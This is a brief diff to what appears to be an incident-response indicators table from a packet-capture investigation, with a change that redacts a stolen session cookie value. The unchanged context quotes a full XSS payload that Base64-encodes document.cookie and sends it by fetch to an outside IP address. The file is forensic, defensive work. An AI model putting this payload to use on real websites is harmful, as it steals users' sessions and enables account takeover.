@@ -24,7 +24,7 @@ This file lists every indicator recovered during the investigation, with its evi
 | XSS payload | `<script>fetch('http://91.92.100.45:8080/collect?c='+btoa(document.cookie))</script>` | POST body, hex plus URL decoded, attack.pcap |
 | Encoding function | btoa (Base64) | recovered from payload |
 | Victim account | p.dumont | login.php POST body, attack.pcap |
-| Stolen session cookie | PHPSESSID=5e81c7a60ec649201724184a1996dae8 | Base64 decode of beacon parameter, attack.pcap |
+| Stolen session cookie | PHPSESSID=[REDACTED] | Base64 decode of beacon parameter, attack.pcap |
 | Unauthorized account | m.renard (origin undetermined) | login.php POST body from attacker IP, attack.pcap |
 
 ## Behavioral indicators
